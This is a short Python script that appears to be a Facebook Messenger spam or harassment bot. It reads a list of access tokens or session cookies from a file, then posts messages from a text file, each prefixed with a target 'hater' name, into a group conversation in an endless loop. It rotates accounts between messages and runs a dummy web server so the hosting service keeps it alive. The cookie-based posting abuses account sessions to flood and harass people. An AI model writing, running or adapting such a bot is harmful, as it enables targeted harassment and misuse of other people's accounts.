import requests
import time
import sys
import threading
import http.server
import socketserver
import os

sys.stdout.reconfigure(line_buffering=True)

# --- SIMPLE SERVER FOR RENDER ---
def run_server():
    PORT = int(os.environ.get('PORT', 10000))
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        httpd.serve_forever()

# --- MAIN BOT LOGIC ---
def start_bot():
    try:
        # Files reading
        with open('tokennum.txt', 'r') as f: keys = [l.strip() for l in f.readlines() if l.strip()]
        with open('convo.txt', 'r') as f: convo_id = f.read().strip()
        with open('NP.txt', 'r') as f: messages = [m.strip() for m in f.readlines() if m.strip()]
        with open('haternames.txt', 'r') as f: hater = f.read().strip()
        with open('time.txt', 'r') as f: speed = int(f.read().strip())

        print(f"BOT STARTED | KEYS: {len(keys)} | CONVO: {convo_id}", flush=True)

        while True:
            for i, msg in enumerate(messages):
                key = keys[i % len(keys)]
                full_msg = f"{hater} {msg}"
                t = time.strftime("%I:%M:%S %p")

                # Check if Key is Token or Cookie
                if "c_user=" in key or "xs=" in key:
                    # COOKIE LOGIC
                    url = "https://mbasic.facebook.com/messages/send/?icm=1"
                    headers = {
                        'Cookie': key,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Referer': f'https://mbasic.facebook.com/messages/read/?tid=cid.g.{convo_id}'
                    }
                    data = {'tids': f'cid.g.{convo_id}', 'body': full_msg, 'send': 'Send'}
                    response = requests.post(url, data=data, headers=headers)
                    status = "COOKIE SUCCESS" if (response.ok or "success" in response.url) else "COOKIE FAIL"
                else:
                    # TOKEN LOGIC
                    url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
                    params = {'access_token': key, 'message': full_msg}
                    response = requests.post(url, json=params)
                    status = "TOKEN SUCCESS" if response.ok else "TOKEN FAIL"

                print(f"[{t}] {status} | Msg: {i+1}", flush=True)
                time.sleep(speed)
                
    except Exception as e:
        print(f"ERROR: {e}", flush=True)

if __name__ == "__main__":
    threading.Thread(target=run_server, daemon=True).start()
    start_bot()
